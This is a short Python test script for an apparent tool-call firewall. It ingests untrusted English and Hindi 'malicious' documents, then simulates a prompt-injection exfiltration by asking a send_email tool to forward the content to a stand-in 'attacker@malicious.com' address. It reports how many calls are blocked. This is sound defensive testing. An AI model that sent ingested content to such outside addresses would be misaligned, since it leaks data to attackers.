from __future__ import annotations

import argparse
import os
import time
import uuid

import requests

ATF_URL = os.environ.get("ATF_URL", "http://localhost:8000")


def ingest(session_id: str, text: str, trust_zone: str, source: str, language: str | None = None) -> str:
    r = requests.post(
        f"{ATF_URL}/tool/ingest",
        json={
            "session_id": session_id,
            "text": text,
            "trust_zone": trust_zone,
            "source": source,
            "language": language,
        },
        timeout=20,
    )
    r.raise_for_status()
    return r.json()["chunk_id"]


def send_email(session_id: str, to: str, subject: str, body: str, chunk_ids: list[str]) -> dict:
    r = requests.post(
        f"{ATF_URL}/tool/send_email",
        json={
            "session_id": session_id,
            "to": to,
            "subject": subject,
            "body": body,
            "evidence_to": {"chunk_ids": chunk_ids},
            "evidence_body": {"chunk_ids": chunk_ids},
        },
        timeout=20,
    )
    r.raise_for_status()
    return r.json()


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("--data_dir", default="../data")
    args = ap.parse_args()

    docs = [
        ("en", "malicious_en.txt"),
        ("hi", "malicious_hi.txt"),
    ]

    attacker = "attacker@malicious.com"
    manager = "manager@org.in"

    total = 0
    blocked = 0

    for lang, fname in docs:
        path = os.path.join(args.data_dir, fname)
        with open(path, "r", encoding="utf-8") as f:
            doc = f.read()

        session_id = f"sess_{uuid.uuid4().hex[:8]}"
        cid = ingest(session_id, doc, "untrusted", f"file://{fname}", lang)

        # Attack attempt
        out = send_email(session_id, attacker, "FWD", doc, [cid])
        total += 1
        if out["decision"].startswith("BLOCK"):
            blocked += 1

        # Safe attempt
        out2 = send_email(session_id, manager, "Summary", "Short summary.", [])
        total += 1
        if out2["decision"].startswith("BLOCK"):
            blocked += 1

    print(f"Total tool calls: {total}")
    print(f"Blocked: {blocked}")
    print(f"Blocked rate: {blocked/total:.2%}")


if __name__ == "__main__":
    main()
